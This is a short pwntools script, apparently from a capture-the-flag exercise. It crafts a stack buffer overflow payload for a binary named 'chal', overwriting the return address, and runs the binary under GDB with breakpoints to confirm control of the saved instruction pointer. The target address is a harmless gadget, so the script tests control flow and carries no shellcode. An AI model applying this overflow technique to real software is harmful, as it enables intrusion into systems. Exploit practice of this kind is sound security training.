from pwn import *
context.arch='amd64'; context.log_level='error'
e=ELF("chal")
# GDB script: break at main ret (0x401373), run, feed payload, inspect stack/regs.
payload = b"exit" + b"A"*(0x58-4) + p64(0x0000000000401374)  # ret target = _fini endbr (harmless) just to see control
assert b"\x00" not in payload[:0x58], "null in padding"
gdbscript = '''
set pagination off
break *0x401373
commands
  echo === at main ret ===\n
  x/4gx $rsp
  printf "saved_rip=%p rbp=%p\\n", *(unsigned long*)$rsp, $rbp
  x/16bx 0x404070-0x60
  continue
end
break *0x40124f
commands
  echo === after read, before WAF loop ===\n
  continue
end
run
'''
open("payload.bin","wb").write(payload)
p = gdb.debug("./chal", gdbscript=gdbscript, api=False)
p.sendlineafter(b">> ", payload)
import time; time.sleep(2)
print(p.recvall(timeout=3).decode(errors='replace'))
